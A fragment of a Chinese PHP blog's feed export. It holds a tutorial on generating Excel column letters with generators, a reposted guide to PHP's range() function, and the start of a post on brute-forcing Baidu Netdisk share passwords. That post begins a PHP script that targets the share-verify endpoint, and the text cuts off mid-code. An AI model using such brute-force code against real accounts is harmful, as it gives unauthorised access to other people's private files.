class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getAlphabet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="string">'A'</span>; $i &lt; <span class="string">'ZZZ'</span>; $i++) &#123;</span><br><span class="line">        <span class="keyword">yield</span> $i;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (getAlphabet() <span class="keyword">as</span> $letter) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $letter . <span class="string">'1'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在优雅了许多。但这种方式和上一种有什么区别呢？<br>请注意这段代码中的<code>yield</code>关键字，这是迭代生成器。我们可以理解为每当 CPU 执行到<code>yield</code>关键字时，就会暂存当前的上下文，并将控制权交回<code>foreach</code>，而不像普通函数一次调用结束后销毁上下文（所以我们需要将函数所产生的变量进行返回），这让我们得以在每次需要到这段函数时，都可以从上次停下的位置继续，而无需暂存整个函数的处理结果，从而节省了内存空间。通过<code>memory_get_usage()</code>函数可以看到，上一种实现方式需要<code>1.9MB</code>，而<code>yield</code>只需要<code>287.6KB</code>，二者的空间复杂度分别为<code>O(n)</code>和<code>O(1)</code>。</p><h1 id="方案三"><a href="#方案三" class="headerlink" title="方案三"></a>方案三</h1><p>虽然上述两种方案已经能够满足正常的需求，而且实现也足够简单。但我们还是要探索一下是否能够解决上述缺陷的方式，这样，这个问题就演变成了二十六进制的字符计数器。</p><p>思路：我们常见的有二进制、八进制、十进制、十六进制，所以我们就可以照猫画虎，写一个二十六进制。通过观察，这些进制均是末位递增，当末位为最大值时，向上一位进位，并将低位复位。那就让我们把想法转换为代码吧：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getAlphabet</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $letter = [];</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">65</span>, $count = <span class="number">0</span>; $i &lt; <span class="number">95</span>; $i++) &#123;</span><br><span class="line">        <span class="comment">// 末位递增处理</span></span><br><span class="line">        <span class="keyword">if</span> ($i &gt; <span class="number">64</span> &amp;&amp; $i &lt; <span class="number">91</span>) &#123;</span><br><span class="line">            $lastPlace = chr($i);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//进位处理</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="number">90</span> === $i) &#123;</span><br><span class="line">            $letter[] = substr(end($letter), <span class="number">0</span>, <span class="number">-1</span>) . chr($i);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 所有位均为Z时，位数+1</span></span><br><span class="line">            <span class="keyword">if</span> (substr_count(end($letter), <span class="string">'Z'</span>) === strlen(end($letter))) &#123;</span><br><span class="line">                $letter[] = implode(<span class="string">''</span>, [<span class="string">'A'</span>, str_repeat(<span class="string">'A'</span>, strlen(end($letter)))]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 同位数下递增</span></span><br><span class="line">                $letter[] = chr(ord(substr(end($letter), <span class="number">0</span>, <span class="number">1</span>)) + <span class="number">1</span>) . <span class="string">'A'</span>;</span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                 * 此种情况下如何进行递增检测处理？如 AXZ 递增后应为 AYA，如何保证随着位数的递增不会消耗更多的时间？</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 进位完成后将计数器归位</span></span><br><span class="line">            $i = <span class="number">65</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 递增低位</span></span><br><span class="line">            $letter[] = substr_replace(end($letter), $lastPlace, <span class="number">-1</span>, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($letter)) &#123;</span><br><span class="line">            $letter[] = <span class="string">'A'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($count &gt; count($data)) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $count++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $letter;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> json_encode(getAlphabet(range(<span class="number">1</span>,<span class="number">100</span>)));</span><br></pre></td></tr></table></figure><p>emmmm，看起来离我们的目标又近了一步：可以连续生成一段字母，并且可以根据我们的数据长度自适应，但是！多位进位如何处理，如何保障多进位处理的性能问题？关于这个问题，目前的想法是参照<a href="https://www.ruanyifeng.com/blog/2011/03/4-bit_computer.html" target="_blank" rel="noopener">计算机的进位实现思想</a>，先挖个坑，等搞清楚来填 :)</p><h1 id="2-导出内容过大"><a href="#2-导出内容过大" class="headerlink" title="2. 导出内容过大"></a>2. 导出内容过大</h1><p>很多项目初期的数据量很小，Excel 导出非常快，但随着数据量的增加，导出越来越慢，直到超时、内存溢出。怎样才能一劳永逸呢？<br>我们知道，PHPExcel（新版为 PhpSpreadsheet)支持向 Excel 中追加内容，所以，我们依然可以使用<code>yield</code>来保证内存：比如内存可以承载 1 万条数据的容量，我们就可以使用 yield 先处理 1 万条暂存于内存中，然后再将这 1 万条追加入磁盘的 Excel 文件，这样既保证了内存的使用，有保证了处理效率。</p><h1 id="3-异步导出"><a href="#3-异步导出" class="headerlink" title="3. 异步导出"></a>3. 异步导出</h1><p>众所周知，PHP 是阻塞式语言，从而导致一些交互后产生的长时间执行的任务难以处理。如果对于一些小型的异步任务通过 crontab 执行，则可能导致后期的定时任务越来越多而难以管理，而 PHP 中的<a href="https://www.php.net/manual/en/function.fastcgi-finish-request.php" target="_blank" rel="noopener"><code>fastcgi_finish_request()</code></a>可以使客户端结束连接后，需要大量时间运行的任务能够继续运行，正好满足我们轻量的异步执行需求。但该方式也会有一些问题，如该方式无错误重试机制。如果有大量需要异步处理的任务需要执行，建议使用 swoole 或者支持异步执行的语言。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol><li><a href="http://www.laruence.com/2010/07/30/1682.html" target="_blank" rel="noopener">注意PHP对字符串的递增运算</a></li><li><a href="https://www.php.net/manual/zh/class.generator.php" target="_blank" rel="noopener">生成器 - PHP手册</a></li><li><a href="https://www.php.net/manual/zh/language.generators.syntax.php" target="_blank" rel="noopener">yield关键字 - PHP手册</a></li><li><a href="https://www.ruanyifeng.com/blog/2011/03/4-bit_computer.html" target="_blank" rel="noopener">四位计算机的原理及实现 - 阮一峰</a></li><li><a href="https://tyloafer.github.io/posts/63198/" target="_blank" rel="noopener">PHP如何读取大文件</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 软件编程 </category>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【转】鲜为人知的 PHP range() 函数</title>
      <link href="/post/php-range-function/"/>
      <url>/post/php-range-function/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8cm9sq38lj309v03yjrd.jpg" alt=""></p><p>PHP中有哪些冷门但很实用的函数？</p><a id="more"></a><p>作为一个 PHPer ，如果想要你生成 <code>[1,31]</code> 区间的 31 个数字，你一般会怎么做？</p><p>仔细想想，好好回忆一下，你第一时间想到的，会不会是使用一个 for 循环来生成，就像下面这样</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$days = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">1</span>; $i &lt;= <span class="number">31</span>; $i++ ) &#123;</span><br><span class="line">    $days[] = $i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我想，应该，很少人会使用 <code>range()</code> 函数来生成<code>$days = range(1,31,1);</code></p><p>我不知道这是不是我们 PHPer 的悲剧，因为，似乎，很少有教程会交代可以使用 <code>foreach(range())</code> 的方式来代替 <code>for</code> 循环。</p><p>其实，PHP 中的 <code>range()</code> 函数比 Python 中的 <code>range()</code> 强大多了，除了没有使用生成器的方式。</p><h1 id="range-函数"><a href="#range-函数" class="headerlink" title="range() 函数"></a>range() 函数</h1><p>根据官方文档，<code>range()</code> 函数被归纳为 「 数组函数 」，因为它的结果就是产生一个数组，一个普通数组。</p><p><code>range()</code> 函数的原型如下</p><p><code>array range ( mixed $start , mixed $end [, number $step = 1 ] )</code><br>range() 函数根据范围 <code>[$start,$end]</code> 创建一个数组，步长为 <code>$step</code> ，默认步长为 <code>1</code></p><blockquote><p>注意： 返回的区间是一个左闭右闭的区间，也就是包含了 $start 和 $end 两个值。</p></blockquote><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>start</td><td>返回的数组区间序列的第一个值</td></tr><tr><td>end</td><td>返回的数组区间序列结束于 end 的值</td></tr><tr><td>step</td><td>如果设置了步长 step，会被作为单元之间的步进值。step 应该为 正值。不设置 step 则默认为 1。</td></tr></tbody></table><h1 id="用法一-：-start-和-end-参数都是整数"><a href="#用法一-：-start-和-end-参数都是整数" class="headerlink" title="用法一 ： $start 和 $end 参数都是整数"></a>用法一 ： $start 和 $end 参数都是整数</h1><ol><li><p>返回整数区间 [0,12] 且步长为 1 的数组</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// array(0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12)</span></span><br><span class="line"><span class="keyword">foreach</span> (range(<span class="number">0</span>, <span class="number">12</span>) <span class="keyword">as</span> $number) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $number;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>返回整数区间 [0,100] 且步长为 10 的数组</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// array(0, 10, 20, 30, 40, 50, 60, 70, 80, 90, 100)</span></span><br><span class="line"><span class="keyword">foreach</span> (range(<span class="number">0</span>, <span class="number">100</span>, <span class="number">10</span>) <span class="keyword">as</span> $number) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $number;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>返回整数区间 [0,99] 且步长为 10 的数组</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// array(0, 10, 20, 30, 40, 50, 60, 70, 80, 90)</span></span><br><span class="line"><span class="keyword">foreach</span> (range(<span class="number">0</span>, <span class="number">99</span>, <span class="number">10</span>) <span class="keyword">as</span> $number) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $number, <span class="string">" "</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><blockquote><p>注意：返回的数组的最后一个值为 90 ，因为 100 &lt; 99 ，所以不满足条件</p></blockquote><ol start="4"><li><p>如果步长为负数，那么会取该步长的绝对值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// array(0, 2, 4, 6, 8, 10, 12)</span></span><br><span class="line"><span class="keyword">foreach</span> (range(<span class="number">0</span>, <span class="number">12</span>，<span class="number">2</span>) <span class="keyword">as</span> $number) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $number;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>如果 $start &lt; $end，那么返回的数组会从大到小</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// array(12, 10, 8, 6, 4, 2, 0)</span></span><br><span class="line"><span class="keyword">foreach</span> (range(<span class="number">12</span>, <span class="number">0</span>，<span class="number">2</span>) <span class="keyword">as</span> $number) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $number;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>如果步长 $step 为 0 ，会抛出一个异常</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Warning: range(): step exceeds the specified range</span></span><br><span class="line">var_dump(range(<span class="number">12</span>, <span class="number">0</span>, <span class="number">0</span>));</span><br></pre></td></tr></table></figure></li><li><p>如果步长为字符串，那么会使用 <code>intval()</code> 转换为整数，如果转换后的结果为 0，则参考 6</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// array(12, 10, 8, 6, 4, 2, 0)</span></span><br><span class="line"><span class="keyword">foreach</span> (range(<span class="number">12</span>, <span class="number">0</span>，<span class="string">'2a'</span>) <span class="keyword">as</span> $number) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $number;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h1 id="用法二-：-start-和-end-参数可以是整数也可以是浮点数，-step-也可以是浮点数"><a href="#用法二-：-start-和-end-参数可以是整数也可以是浮点数，-step-也可以是浮点数" class="headerlink" title="用法二 ： $start 和 $end 参数可以是整数也可以是浮点数，$step 也可以是浮点数"></a>用法二 ： <code>$start</code> 和 <code>$end</code> 参数可以是整数也可以是浮点数，<code>$step</code> 也可以是浮点数</h1><ol><li><p><code>$start</code> 和 <code>$end</code> 是浮点数，而 <code>$step</code> 是整数，结果和整数是类似的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// array(12.8, 10.8, 8.8, 6.8, 4.8, 2.8)</span></span><br><span class="line"><span class="keyword">foreach</span> (range(<span class="number">12.8</span>, <span class="number">2.2</span>，<span class="number">2</span>) <span class="keyword">as</span> $number) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $number;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>$start</code> 和 <code>$end</code> 是浮点数，且 <code>$step</code> 也是浮点数，结果和整数也是类似的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// array(12.8, 10.3, 7.8, 5.3, 2.8)</span></span><br><span class="line"><span class="keyword">foreach</span> (range(<span class="number">12.8</span>, <span class="number">2.2</span>，<span class="number">2.5</span>) <span class="keyword">as</span> $number) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $number;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>如果步长为字符串，那么会使用 <code>doubleval()</code> 转换为浮点数，如果步长为 <code>0.0</code> 那么将抛出异常</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// array(12.8, 10.3, 7.8, 5.3, 2.8)</span></span><br><span class="line"><span class="keyword">foreach</span> (range(<span class="number">12.8</span>, <span class="number">2.2</span>，<span class="string">'2.5'</span>) <span class="keyword">as</span> $number) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $number;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>转换后步长为 0 则抛出异常</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Warning: range(): step exceeds the specified range</span></span><br><span class="line"><span class="keyword">foreach</span> (range(<span class="number">12.8</span>, <span class="number">2.2</span>，<span class="string">'a2.5'</span>) <span class="keyword">as</span> $number) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $number;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="用法三-：-start-和-end-如果有一个是整数或者浮点数"><a href="#用法三-：-start-和-end-如果有一个是整数或者浮点数" class="headerlink" title="用法三 ： $start 和 $end 如果有一个是整数或者浮点数"></a>用法三 ： <code>$start</code> 和 <code>$end</code> 如果有一个是整数或者浮点数</h1><p><code>$start</code> 和 <code>$end</code> 如果有一个是整数或者浮点数，而另一个是字符串，那么会将另一个也转换为整数或者浮点数</p><ol><li><p>一个是整数而另一个是字符串整数，那么会将另一个转换为整数，结果和都是整数是类似的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// array(0, 2, 4, 6, 8, 10, 12)</span></span><br><span class="line"><span class="keyword">foreach</span> (range(<span class="number">0</span>, <span class="string">'12'</span>，<span class="number">2</span>) <span class="keyword">as</span> $number) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $number;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>一个是浮点数而另一个是字符串整数或浮点数，那么会将另一个转换为浮点数，结果和都是整数是类似的</p></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// array(12.8, 10.8, 8.8, 6.8, 4.8, 2.8)</span></span><br><span class="line"><span class="keyword">foreach</span> (range(<span class="number">12.8</span>, <span class="string">'2'</span>, <span class="number">2</span>) <span class="keyword">as</span> $number) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $number;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="用法四-：-start-和-end-如果全部是字符串"><a href="#用法四-：-start-和-end-如果全部是字符串" class="headerlink" title="用法四 ： $start 和 $end 如果全部是字符串"></a>用法四 ： <code>$start</code> 和 <code>$end</code> 如果全部是字符串</h1><p><code>$start</code> 和 <code>$end</code> 如果全部是字符串，那么会取两个字符串的第一个字母，并按照 ASCII 字母顺序表，取步长对应的值</p><ol><li><p>如果 <code>$start</code> 和 <code>$end</code> 都是单个字母，那么直接按照 ASCII 顺序取步长的值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// array('a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i');</span></span><br><span class="line"><span class="keyword">foreach</span> (range(<span class="string">'a'</span>, <span class="string">'i'</span>) <span class="keyword">as</span> $letter) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $letter;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>如果按照 ASCII 顺序，<code>$start</code> 大于 <code>$end</code> ，那么会反向步长取值，这个和整数是类似的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// array('c', 'b', 'a');</span></span><br><span class="line"><span class="keyword">foreach</span> (range(<span class="string">'c'</span>, <span class="string">'a'</span>) <span class="keyword">as</span> $letter) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $letter;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>如果 <code>$start</code> 或 <code>$end</code> 任意一个字符串长度大于 1 ，那么只会取第一个字母</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// array('a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i');</span></span><br><span class="line"><span class="keyword">foreach</span> (range(<span class="string">'abc'</span>, <span class="string">'i'</span>) <span class="keyword">as</span> $letter) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $letter;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>如果两个都是字符串，而其中一个是整数字符串或者浮点数字符串，那也会当作普通字符串来处理</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> implode(<span class="string">""</span>,range(<span class="string">"9 "</span>,<span class="string">"Q"</span>));  <span class="comment">//space after the 9</span></span><br><span class="line"><span class="comment">// prints 9:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQ</span></span><br></pre></td></tr></table></figure></li></ol><blockquote><p>那么，我们如何使用<code>range()</code>来输出 <a href="https://zh.wikipedia.org/wiki/ASCII" target="_blank" rel="noopener">ASCII</a> 的所有可见字符呢？</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> json_encode(range(<span class="string">' '</span>, <span class="string">'~'</span>)); </span><br></pre></td></tr></table></figure><p>输出是</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">" "</span>,<span class="string">"!"</span>,<span class="string">"\""</span>,<span class="string">"#"</span>,<span class="string">"$"</span>,<span class="string">"%"</span>,<span class="string">"&amp;"</span>,<span class="string">"'"</span>,<span class="string">"("</span>,<span class="string">")"</span>,<span class="string">"*"</span>,<span class="string">"+"</span>,<span class="string">","</span>,<span class="string">"-"</span>,<span class="string">"."</span>,<span class="string">"\/"</span>,<span class="string">"0"</span>,<span class="string">"1"</span>,<span class="string">"2"</span>,<span class="string">"3"</span>,<span class="string">"4"</span>,<span class="string">"5"</span>,<span class="string">"6"</span>,<span class="string">"7"</span>,<span class="string">"8"</span>,<span class="string">"9"</span>,<span class="string">":"</span>,<span class="string">";"</span>,<span class="string">"&lt;"</span>,<span class="string">"="</span>,<span class="string">"&gt;"</span>,<span class="string">"?"</span>,<span class="string">"@"</span>,<span class="string">"A"</span>,<span class="string">"B"</span>,<span class="string">"C"</span>,<span class="string">"D"</span>,<span class="string">"E"</span>,<span class="string">"F"</span>,<span class="string">"G"</span>,<span class="string">"H"</span>,<span class="string">"I"</span>,<span class="string">"J"</span>,<span class="string">"K"</span>,<span class="string">"L"</span>,<span class="string">"M"</span>,<span class="string">"N"</span>,<span class="string">"O"</span>,<span class="string">"P"</span>,<span class="string">"Q"</span>,<span class="string">"R"</span>,<span class="string">"S"</span>,<span class="string">"T"</span>,<span class="string">"U"</span>,<span class="string">"V"</span>,<span class="string">"W"</span>,<span class="string">"X"</span>,<span class="string">"Y"</span>,<span class="string">"Z"</span>,<span class="string">"["</span>,<span class="string">"\\"</span>,<span class="string">"]"</span>,<span class="string">"^"</span>,<span class="string">"_"</span>,<span class="string">"`"</span>,<span class="string">"a"</span>,<span class="string">"b"</span>,<span class="string">"c"</span>,<span class="string">"d"</span>,<span class="string">"e"</span>,<span class="string">"f"</span>,<span class="string">"g"</span>,<span class="string">"h"</span>,<span class="string">"i"</span>,<span class="string">"j"</span>,<span class="string">"k"</span>,<span class="string">"l"</span>,<span class="string">"m"</span>,<span class="string">"n"</span>,<span class="string">"o"</span>,<span class="string">"p"</span>,<span class="string">"q"</span>,<span class="string">"r"</span>,<span class="string">"s"</span>,<span class="string">"t"</span>,<span class="string">"u"</span>,<span class="string">"v"</span>,<span class="string">"w"</span>,<span class="string">"x"</span>,<span class="string">"y"</span>,<span class="string">"z"</span>,<span class="string">"&#123;"</span>,<span class="string">"|"</span>,<span class="string">"&#125;"</span>,<span class="string">"~"</span>] </span><br></pre></td></tr></table></figure></blockquote><h1 id="原文地址"><a href="#原文地址" class="headerlink" title="原文地址"></a>原文地址</h1><p><a href="https://www.twle.cn/c/yufei/phpmiss/phpmiss-basic-range.html" target="_blank" rel="noopener">https://www.twle.cn/c/yufei/phpmiss/phpmiss-basic-range.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 软件编程 </category>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>百度网盘分享密码暴力破解</title>
      <link href="/post/crack-pwd-of-baidu-netdisk/"/>
      <url>/post/crack-pwd-of-baidu-netdisk/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/middle/006y8mN6ly1g8cm8wum14j30wq0fc3zg.jpg" alt=""></p><p>前几天阅读了一篇<a href="https://thezerohack.com/hack-any-instagram" target="_blank" rel="noopener">文章</a>，作者通过枚举重置密码的手机验证码来修改任意用户的账号密码。这种方式被普遍应用，但我们确实比较少的关心这可能存在漏洞，纯数字的验证码只要在失效前通过程序枚举很快就能被破解。受此启发，也想尝试下百度网盘的分享密码破解试验。</p><a id="more"></a><p>百度网盘的分享密码为4个字符，因此，我们可以通过调用认证接口来暴力破解。</p><p>通过 Chrome 的网络请求分析，结合 POSTMAN 模拟请求，我们得知，网盘密码认证主要参数有</p><ol><li>分享链接识别码</li><li>毫秒时间戳</li><li>http 的 refer 头</li><li>post 方式发送的密码</li></ol><p>于是，我们有了以下的一段代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">crackBaiduNetdiskPwd</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $shareCode = ltrim(strstr($url, <span class="string">'/1'</span>),<span class="string">'/1'</span>);</span><br><span class="line">    $baseUrl = <span class="string">'https://pan.baidu.com/share/verify?'</span>;</span><br><span class="line">    $get_params = [</span><br><span class="line">        <span class="string">'surl'</span> =&gt; $shareCode,</span><br><span class="line">        <span class="string">'t'</span> =&gt; intval(microtime(<span class="keyword">true</span>) * <span class="number">1000</span>),</span><br><span class="line">        <span class="string">'channel'</span> =&gt; <span class="string">'chunlei'</span>,</span><br><span class="line">        <span class="string">'web'</span> =&gt; <span class="number">1</span>,</span><br><span class="line">        <span class="string">'clienttype'</span> =&gt; <span class="number">0</span>,</span><br><span class="line">        <span class="string">'app_id'</span> =&gt; <span class="number">123456</span>,</span><br><span class="line">        <span class="string">'bdstoken'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'logid'</span> =&gt; <span class="string">'MTU2Njc5MTgzODkyNzAuNjM3NzgzODMwMzQ1MjE3NQ=='</span></span><br><span 